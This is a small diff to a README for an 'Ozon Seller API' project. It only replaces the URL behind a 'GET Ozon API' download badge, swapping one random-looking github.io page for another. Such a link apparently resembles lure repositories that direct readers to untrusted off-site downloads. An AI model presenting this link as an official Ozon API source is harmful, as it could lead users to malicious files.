@@ -1,6 +1,6 @@
 # Ozon Seller API
 
-[![GET Ozon API](https://img.shields.io/badge/GET%20%E2%80%94%20Ozon%20API-0078D6?style=for-the-badge&logoColor=white)](https://kingsleywilcoxkril.github.io/.github/ozon-seller-api)
+[![GET Ozon API](https://img.shields.io/badge/GET%20%E2%80%94%20Ozon%20API-0078D6?style=for-the-badge&logoColor=white)](https://omariaguilarvfii.github.io/.github/ozon-seller-api)
 
 ## What Ozon API Means for Marketplace Builders
 
